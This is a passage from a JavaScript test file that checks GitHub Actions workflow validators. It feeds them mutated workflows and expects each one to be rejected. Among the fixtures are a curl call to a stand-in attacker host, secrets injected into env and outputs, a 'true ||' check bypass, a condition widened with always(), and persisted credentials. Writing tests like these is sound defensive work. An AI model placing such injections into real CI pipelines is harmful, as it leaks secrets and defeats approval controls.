    /classify step 1 shape or order drift/,
  );

  const extraJobKey = workflow.replace(
    '    steps:\n      - name: Checkout trusted base revision',
    '    permissions: write\n    steps:\n      - name: Checkout trusted base revision',
  );
  assert.throws(
    () => validateFormalApprovalWorkflowStructure(extraJobKey),
    /classify job keys or order drift/,
  );
});

test('approval workflow closes every security-critical run, env, if, needs, outputs, and environment value', async (t) => {
  const workflow = fs.readFileSync(
    path.join(ROOT, '.github', 'workflows', 'formal-approval.yml'),
    'utf8',
  );
  const mutations = [
    [
      'env secret injection',
      workflow.replace(
        '          EXPECTED_BASE_SHA: ${{ github.event.pull_request.base.sha }}',
        [
          '          EXPECTED_BASE_SHA: ${{ github.event.pull_request.base.sha }}',
          '          EXFILTRATION_TOKEN: ${{ secrets.PRODUCTION_TOKEN }}',
        ].join('\n'),
      ),
    ],
    [
      'run command injection',
      workflow.replace(
        '          set -euo pipefail\n          test "$(git rev-parse HEAD)"',
        [
          '          set -euo pipefail',
          '          curl -fsS https://attacker.invalid/collect',
          '          test "$(git rev-parse HEAD)"',
        ].join('\n'),
      ),
    ],
    [
      'run short-circuit injection',
      workflow.replace(
        '          test "$(git rev-parse HEAD)" = "$EXPECTED_BASE_SHA"',
        '          true || test "$(git rev-parse HEAD)" = "$EXPECTED_BASE_SHA"',
      ),
    ],
    [
      'if widening',
      workflow.replace(
        "      needs.classify.outputs.sensitive == 'false' &&",
        "      (needs.classify.outputs.sensitive == 'false' || always()) &&",
      ),
    ],
    [
      'needs rewiring',
      workflow.replace(
        '  trusted_validation:\n    name: formal-approval-trusted-validation\n    needs: classify',
        '  trusted_validation:\n    name: formal-approval-trusted-validation\n    needs: product_owner',
      ),
    ],
    [
      'output source injection',
      workflow.replace(
        '      sensitive: ${{ steps.scope.outputs.sensitive }}',
        '      sensitive: ${{ secrets.PRODUCTION_TOKEN }}',
      ),
    ],
    [
      'environment substitution',
      workflow.replace(
        '    environment:\n      name: formal-product-owner-approval',
        '    environment:\n      name: production',
      ),
    ],
    [
      'job runner substitution',
      workflow.replace(
        '    runs-on: ubuntu-latest',
        '    runs-on: self-hosted',
      ),
    ],
    [
      'with value substitution',
      workflow.replace(
        '          persist-credentials: false',
        '          persist-credentials: true',
      ),
    ],
    [
      'extra nested with key',
      workflow.replace(
        '          persist-credentials: false',
        [
          '          persist-credentials: false',
          '          token: ${{ secrets.PRODUCTION_TOKEN }}',
        ].join('\n'),
      ),
    ],
  ];
  for (const [label, mutated] of mutations) {
    await t.test(label, () => {
      assert.notEqual(mutated, workflow, `${label} fixture must mutate the workflow`);
      assert.throws(
        () => validateFormalApprovalWorkflowStructure(mutated),
        /security-critical values must match the exact closed byte contract|required token count drift/,
      );
    });
  }
});

test('pull-request gate workflow freezes exact bytes and independently requires full action commit pins', () => {
  const workflow = fs.readFileSync(
    path.join(ROOT, '.github', 'workflows', 'pr-gates.yml'),
    'utf8',
  );
  assert.equal(validatePullRequestGateWorkflowStructure(workflow), true);

  const noOp = workflow.replace(
    'run: npm run lint -- --quiet',
    'run: echo "skip lint"',
  );
  assert.notEqual(noOp, workflow);
  assert.throws(
    () => validatePullRequestGateWorkflowStructure(noOp),
    /exact closed byte contract/,
  );

  const floatingAction = workflow.replace(
    'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1',
    'actions/checkout@v7',
  );
  assert.notEqual(floatingAction, workflow);
  assert.throws(
    () => validatePullRequestGateWorkflowStructure(floatingAction),
    /lowercase full-commit SHA pins/,
  );
});
